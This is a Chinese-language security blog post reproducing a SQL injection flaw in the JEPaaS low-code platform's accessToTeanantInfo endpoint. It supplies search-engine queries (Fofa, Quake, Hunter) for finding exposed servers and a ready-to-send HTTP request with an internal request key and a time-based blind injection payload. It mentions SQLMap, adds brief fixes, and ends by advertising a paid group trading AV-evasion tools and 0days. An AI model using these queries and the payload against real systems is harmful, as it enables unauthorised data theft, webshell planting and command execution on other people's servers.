#  【漏洞复现】JEPaaS 低代码平台 accessToTeanantInfo SQL注入漏洞 | 附poc   
原创 xiaocaiji  网安鲲为帝   2024-06-01 19:38  
  
**0x00****免责声明**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
本  
文  
仅  
用  
于  
技  
术  
讨  
论  
与  
学  
习  
，  
利  
用  
此  
文  
所  
提  
供  
的  
信  
息  
而  
造  
成  
的  
任  
何  
直  
接  
或  
者  
间  
接  
的  
后  
果  
及  
损  
失  
，  
均  
由  
使  
用  
者  
本  
人  
负  
责  
，  
文  
章  
作  
者  
及  
本  
公  
众  
号  
团  
队  
不  
为  
此  
承  
担  
任  
何  
责  
任  
。  
  
  
**0x01 漏洞描述**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
JEPaaS 低代码平台 accessToTeanantInfo SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等  
。  
  
  
**0x02 空间测绘**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
测  
绘  
语  
法：  
```
Fofa：icon_hash="-999810473"
quake：favicon: "cebfb3e5342abd7b01618a0cfbbe0377"
hunter：web.icon="cebfb3e5342abd7b01618a0cfbbe0377"
```  
  
  
****  
**0x03 漏洞复现**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
登录界面如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJmLpYrV0MSwhGCYCUuxMv1EFoyOtL6rniaAyOTa6FdIfIib1U2w0nxzbTjRdk1dHcbSe9fUCzgic3VA/640?wx_fmt=other&from=appmsg "")  
  
1.SQL注入点POI数据包如下：  
```
POST /rbac/im/accessToTeanantInfo HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
internalRequestKey: schedule_898901212
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP(5)))moYz)-- sBPi
```  
  
  
2.SQLMap跑注入  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJmLpYrV0MSwhGCYCUuxMv1lxI4WQOBzgPl2hDVOxicInbicsSQHL850oZMoTtxDM7peG4NzicKoCAXA/640?wx_fmt=other&from=appmsg "")  
  
  
**0x04 修复意见**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
1、请联系厂商进行修复。   
  
2、如非必要，禁止公网访问该系统。  
  
3、设置白名单访问。  
  
  
**0x05 圈子进入**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
主要致力于打造全网最强免杀技术工具，分享0day、免杀、渗透等网络安全技术，师傅们要进抓紧哦！后续价格只增不减，错过机会难再遇哦！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJmLpYrV0MSwhGCYCUuxMv1wu8nG73by5UgiaJY6d69njTC9zZSqbHL4FmZ5Y2THFhfa72jgtcjpog/640?wx_fmt=jpeg&from=appmsg "")  
  
  
**0x06 欢迎进群交流**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
添加微信进群：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJdfiaGbzW6sp0kFvhYC7ejuJuS6lWyHyUGg40F2QVic6goic34EbYceQ2WE4eyMZ8oxbswQkhzJLhNQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
